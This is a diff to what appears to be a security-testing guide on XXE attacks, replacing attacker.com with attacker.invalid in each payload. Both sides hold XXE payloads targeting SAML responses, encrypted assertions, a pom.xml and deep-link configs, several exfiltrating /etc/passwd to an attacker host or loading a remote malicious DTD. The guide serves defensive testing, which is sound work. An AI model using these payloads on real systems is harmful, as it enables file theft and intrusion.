@@ -261,7 +261,7 @@ SAML assertions are prime XXE targets. Test both requests and responses:
 
 ```xml
 <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
-  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.invalid/exfil">]>
   <saml:Assertion>
     <saml:AttributeValue>&xxe;</saml:AttributeValue>
   </saml:Assertion>
@@ -273,7 +273,7 @@ SAML assertions are prime XXE targets. Test both requests and responses:
 ```xml
 <!-- Inject XXE before encryption, Service Provider decrypts and processes -->
 <saml:EncryptedAssertion>
-  <!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
+  <!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.invalid/evil.dtd"> %dtd;]>
   <EncryptedData>...</EncryptedData>
 </saml:EncryptedAssertion>
 ```
@@ -325,7 +325,7 @@ iOS deep linking configuration files:
 <?xml version="1.0"?>
 <!DOCTYPE data [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.invalid/?x=%file;'>">
   %eval;
   %exfil;
 ]>
@@ -463,7 +463,7 @@ test:
 <!-- malicious pom.xml in supply chain -->
 <?xml version="1.0"?>
 <!DOCTYPE project [
-  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=">
+  <!ENTITY xxe SYSTEM "http://attacker.invalid/exfil?data=">
 ]>
 <project>
   <modelVersion>4.0.0</modelVersion>
@@ -601,7 +601,7 @@ sequenceDiagram
 ```xml
 <![CDATA[<!DOCTYPE data [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.invalid/?x=%file;'>">
 %eval;
 %exfil;
 ]>]]>
@@ -733,7 +733,7 @@ sequenceDiagram
 
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
-   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.invalid/?data=%file;'>">
    %eval;
    %exfil;
    ```
@@ -742,7 +742,7 @@ sequenceDiagram
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE data [
-     <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
+     <!ENTITY % dtd SYSTEM "http://attacker.invalid/malicious.dtd">
      %dtd;
    ]>
    <data>test</data>
